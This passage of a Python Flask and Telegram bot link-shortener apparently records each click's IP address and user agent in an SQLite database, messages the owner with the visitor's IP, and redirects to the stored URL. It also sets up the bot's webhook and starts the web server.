    original = row[0]
    c.execute("INSERT INTO clicks (link_id, ip, user_agent, timestamp) VALUES (?,?,?,?)", (link_id, ip, ua, datetime.datetime.now()))
    c.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id=?", (link_id,))
    conn.commit()
    conn.close()
    try:
        bot.send_message(OWNER_ID, f"📊 Click on {link_id}\nIP: {ip}")
    except: pass
    return redirect(original)

@app.route('/webhook', methods=['POST'])
def webhook():
    update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
    bot.process_new_updates([update])
    return 'OK', 200

def run_bot():
    bot.remove_webhook()
    bot.set_webhook(url=f"{BASE_URL}/webhook")
    print(f"✅ Webhook set")

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
